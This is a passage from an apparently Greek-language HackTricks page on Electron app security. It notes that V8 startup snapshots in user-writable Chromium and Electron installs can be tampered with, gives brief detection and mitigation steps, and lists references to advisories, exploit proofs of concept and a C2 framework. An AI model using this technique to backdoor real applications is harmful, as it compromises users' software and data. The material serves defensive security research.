- Chromium browsers: Το ίδιο concept παραποίησης εφαρμόζεται σε Chrome/derivatives εγκατεστημένα σε τοποθεσίες όπου ο χρήστης έχει δικαιώματα εγγραφής. Το Chrome διαθέτει άλλες μετριάσεις ακεραιότητας αλλά ρητά εξαιρεί φυσικά τοπικές επιθέσεις από το threat model του.

Detection and mitigations
- Treat snapshots as executable content and include them in integrity enforcement (CVE-2025-55305 fix).
- Prefer admin-writable-only install locations; baseline and monitor hashes for v8_context_snapshot.bin and browser_v8_context_snapshot.bin.
- Detect early-runtime builtin clobbering and unexpected snapshot changes; alert when deserialized snapshots do not match expected values.

## **Αναφορές**

- [SecureLayer7: Electron Research in Desktop apps (Part 1)](https://blog.securelayer7.net/electron-app-security-risks/)
- [VS Code RCE PoC (CVE-2021-43908) – electrovolt](https://github.com/Sudistark/vscode-rce-electrovolt)
- [GitHub Advisory GHSA-2q4g-w47c-4674 (CVE-2020-15174)](https://github.com/advisories/GHSA-2q4g-w47c-4674)
- [MSRC: CVE-2021-43908](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-43908)
- [Trail of Bits: Subverting code integrity checks to locally backdoor Signal, 1Password, Slack, and more](https://blog.trailofbits.com/2025/09/03/subverting-code-integrity-checks-to-locally-backdoor-signal-1password-slack-and-more/)
- [Electron fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [Electron ASAR integrity](https://www.electronjs.org/docs/latest/tutorial/asar-integrity)
- [V8 custom startup snapshots](https://v8.dev/blog/custom-startup-snapshots)
- [electron/mksnapshot](https://github.com/electron/mksnapshot)
- [MITRE ATT&CK T1218.015](https://attack.mitre.org/techniques/T1218/015/)
- [Loki C2](https://github.com/boku7/Loki/)
- [Chromium: Disable loading of unsigned code (CIG)](https://chromium.googlesource.com/chromium/src/+/refs/heads/lkgr/docs/design/sandbox.md#disable-loading-of-unsigned-code-cig)
- [Chrome security FAQ: physically local attacks out of scope](https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#why-arent-physically-local-attacks-in-chromes-threat-model)
- [https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
- [https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
- [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [https://www.youtube.com/watch?v=a-YnG3Mx-Tg](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- More researches and write-ups about Electron security in [https://github.com/doyensec/awesome-electronjs-hacking](https://github.com/doyensec/awesome-electronjs-hacking)
- [https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)

{{#include ../../../banners/hacktricks-training.md}}
